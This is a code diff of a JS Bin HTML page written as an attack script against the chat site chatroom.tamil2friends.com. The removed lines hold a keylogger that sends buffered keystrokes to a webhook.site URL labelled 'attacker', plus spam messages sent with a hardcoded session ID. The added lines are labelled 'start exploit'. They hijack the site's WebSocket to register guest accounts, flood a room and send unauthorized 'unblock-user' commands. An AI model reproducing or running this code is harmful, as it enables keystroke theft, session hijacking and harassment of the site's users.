@@ -1,10 +1,9 @@
+
 <!DOCTYPE html>
 <!--
 Created using JS Bin
 http://jsbin.com
-
 Copyright (c) 2019 by thegirlwiththedragontatoo (http://jsbin.com/zumijez/1/edit)
-
 Released under the MIT license: http://jsbin.mit-license.org
 -->
 <meta name="robots" content="noindex">
@@ -16,50 +15,69 @@ Released under the MIT license: http://jsbin.mit-license.org
 </head>
 <body>
   <script>
-//     document.domain="tamil2friends.com"
-//     console.log("hi start", parent.document.cookie);
-//     console.log("check elem",window.parent.document.getElementById('#unblock'));
-//     console.log("check elem1",window.parent.$("#unblock"));
-    ws=new WebSocket("wss://chatroom.tamil2friends.com/chat")
-    ws.onmessage = function(m) {var jsonData = JSON.parse(m.data);var dataType = jsonData.type;console.log("message----",jsonData.data);}
-    console.log("ws--",ws);
-//     ws.send(JSON.stringify({"type":"init","data":{"session":"dsmq9q4okl9nq4nva1rtu2ekbi"}}))
-//     ws.send(JSON.stringify({"type":"fetch","data":{"room":"kudumi"}}))
-//     ws.send(JSON.stringify({"type":"send","data":{"color":"black","room":"main","gifinput":"","_gifhidden":"","yinput":"","msg":"hii","type":"text"}}))
-    var buffer = [];
-var attacker = 'https://webhook.site/aee586cf-3dca-4d33-b2c9-4f979d72daee?c='
 
-document.onkeydown = function(e) {
-    var timestamp = Date.now() | 0;
-    var stroke = e.key;
-//         {
-//         k: e.key,
-//         t: timestamp
-//     };
-    buffer.push(stroke);
-  if (buffer.length > 10) {
-//     if (buffer.length > 0) {
-        var data = encodeURIComponent(JSON.stringify(buffer));
-        new Image().src = attacker + data;
-        buffer = [];
-//     }
-  }
-}
-window.setTimeout(function() {
-  ws.send(JSON.stringify({"type":"init","data":{"session":"dsmq9q4okl9nq4nva1rtu2ekbi"}}))
-}, 3000);
-window.setTimeout(function() {
-  ws.send(JSON.stringify({"type":"register","data":{"username":"Touchofsuccess111","gender":"male"}}))
-}, 4000);
-window.setInterval(function() {
-  ws.send(JSON.stringify({"type":"send","data":{"color":"black","room":"main","gifinput":"","_gifhidden":"","yinput":"","msg":"hii","type":"text"}}))
-}, 8000);
-window.setTimeout(function() {
-  ws.close();
-}, 24000);
+    console.log("start exploit...");
+    const MSG = "Mazhai :P";
+    const ROOM = "kudumi";
+    var guest = false;
+    var allok = false;
+    var guestname = "Dragon";
+    var user = '';
+    var role = '';
+    ws=new WebSocket("wss://chatroom.tamil2friends.com/chat")
+    ws.onmessage = function(m) {
+      var jsonData = JSON.parse(m.data);
+      var dataType = jsonData.type;
+      console.log("message----",jsonData.data);
+      if(dataType=="register"){
+        	user = jsonData.data.username;
+          role = jsonData.data.role
+           if(jsonData.data.status=="success"){
+           	if((user != 'mazhai')&&(user == 'suri25')){
+               window.setInterval(function() {
+                  if(ws.OPEN){send(ROOM, MSG);}
+               }, 2000);
+            	/* send() */;
+            }
+           }
+          if(jsonData.data.status=="guest"){
+          	guest = true;
+            register(guestname);
+          }
+           if(jsonData.data.type=="error"){
+          	guestname = guestname + Math.floor((Math.random() * 10) + 1);
+            register(guestname);
+          }
+          
+        }
+  
+    }
+    console.log("ws--",ws);
+    initsession = () => {
+    	ws.send(JSON.stringify({"type":"init","data":{"session":"dsmq9q4okl9nq4nva1rtu2rkbi"}}));
+    }
+    register = (guestname) => {
+    	 if(guest) {ws.send(JSON.stringify({"type":"register","data":{"username":guestname,"gender":"male"}}));}
+    }
+    send = (room,msg) => {
+    	console.log("state:", guest, user, role);
+      ws.send(JSON.stringify({"type":"send","data":{"color":"black","room":room,"gifinput":"","_gifhidden":"","yinput":"","msg":msg,"type":"text"}}));
+      ws.send(JSON.stringify({"type":"unblock-user","data":{"username":"mazhai"}}));
+    }
     
-//     window.top.location.href = "http://chatroom.tamil2friends.com/login.php";
-//     parent.location.href = "http://chatroom.tamil2friends.com/login.php";
+    ws.onopen = () => {
+      initsession();
+			register(guestname);
+      /* window.setTimeout(function() {
+        connect(guestname);
+      }, 6000); */
+
+      window.setTimeout(function() {
+        ws.close();
+      }, 4000);
+    }
+    
+    
   </script>
 </body>
 </html>
